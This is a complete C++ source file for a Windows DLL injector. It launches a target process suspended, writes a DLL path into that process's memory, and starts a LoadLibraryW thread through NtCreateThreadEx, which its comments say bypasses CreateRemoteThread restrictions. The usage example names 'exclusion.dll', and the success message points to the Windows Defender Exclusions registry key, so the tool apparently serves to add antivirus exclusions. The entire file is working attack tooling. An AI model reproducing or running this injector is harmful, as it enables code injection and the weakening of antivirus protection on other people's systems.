#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

// NtCreateThreadEx based DLL injector
// Bypasses CreateRemoteThread restrictions on modern Windows
// Requires: Admin privileges, run from Developer Command Prompt

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE hThread,
    ACCESS_MASK DesiredAccess,
    LPVOID ObjectAttributes,
    HANDLE ProcessHandle,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    BOOL CreateSuspended,
    DWORD StackZeroBits,
    DWORD SizeOfStackCommit,
    DWORD SizeOfStackReserve,
    LPVOID lpBytesBuffer
);

bool InjectDLL(HANDLE hProcess, DWORD pid, const wchar_t* dllPath) {
    size_t pathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);

    std::wcout << L"[+] Opened process PID: " << pid << std::endl;

    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, pathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteBuffer) {
        std::wcerr << L"[!] VirtualAllocEx failed. Error: " << GetLastError() << std::endl;
        return false;
    }
    std::wcout << L"[+] Allocated memory in target process" << std::endl;

    if (!WriteProcessMemory(hProcess, remoteBuffer, dllPath, pathSize, NULL)) {
        std::wcerr << L"[!] WriteProcessMemory failed. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        return false;
    }
    std::wcout << L"[+] Wrote DLL path to target process memory" << std::endl;

    LPVOID loadLibAddr = (LPVOID)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
    if (!loadLibAddr) {
        std::wcerr << L"[!] GetProcAddress failed." << std::endl;
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        return false;
    }
    std::wcout << L"[+] LoadLibraryW at: " << loadLibAddr << std::endl;

    // Load NtCreateThreadEx from ntdll
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(
        GetModuleHandleW(L"ntdll.dll"), "NtCreateThreadEx"
    );
    if (!NtCreateThreadEx) {
        std::wcerr << L"[!] Failed to get NtCreateThreadEx" << std::endl;
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        return false;
    }
    std::wcout << L"[+] Got NtCreateThreadEx" << std::endl;

    HANDLE hThread = NULL;
    NTSTATUS status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        (LPTHREAD_START_ROUTINE)loadLibAddr,
        remoteBuffer,
        FALSE, 0, 0, 0, NULL
    );

    if (status != 0 || !hThread) {
        std::wcerr << L"[!] NtCreateThreadEx failed. NTSTATUS: 0x" << std::hex << status << std::endl;
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        return false;
    }

    std::wcout << L"[+] Thread created via NtCreateThreadEx, waiting..." << std::endl;
    WaitForSingleObject(hThread, 5000);

    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);
    std::wcout << L"[+] Thread exit code (DLL handle): " << exitCode << std::endl;

    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);

    if (exitCode == 0) {
        std::wcerr << L"[!] DLL load returned NULL - check DLL path exists" << std::endl;
        return false;
    }

    std::wcout << L"[+] DLL injected successfully!" << std::endl;
    return true;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc != 3) {
        std::wcout << L"Usage: injector.exe <target_exe> <dll_path>" << std::endl;
        std::wcout << L"Example: injector.exe C:\\Windows\\System32\\notepad.exe C:\\projects\\exclusion.dll" << std::endl;
        return 1;
    }

    const wchar_t* targetExe = argv[1];
    const wchar_t* dllPath   = argv[2];

    std::wcout << L"[*] Spawning: " << targetExe << std::endl;
    std::wcout << L"[*] DLL: " << dllPath << std::endl;

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};

    if (!CreateProcessW(targetExe, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        std::wcerr << L"[!] CreateProcess failed. Error: " << GetLastError() << std::endl;
        return 1;
    }
    std::wcout << L"[+] Spawned suspended PID: " << pi.dwProcessId << std::endl;

    bool ok = InjectDLL(pi.hProcess, pi.dwProcessId, dllPath);

    ResumeThread(pi.hThread);
    std::wcout << L"[+] Process resumed" << std::endl;

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    if (ok) {
        std::wcout << L"[+] Done - check regedit: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths" << std::endl;
    }

    return ok ? 0 : 1;
}

// Compile: cl injector.cpp /Fe:injector.exe /EHsc /nologo
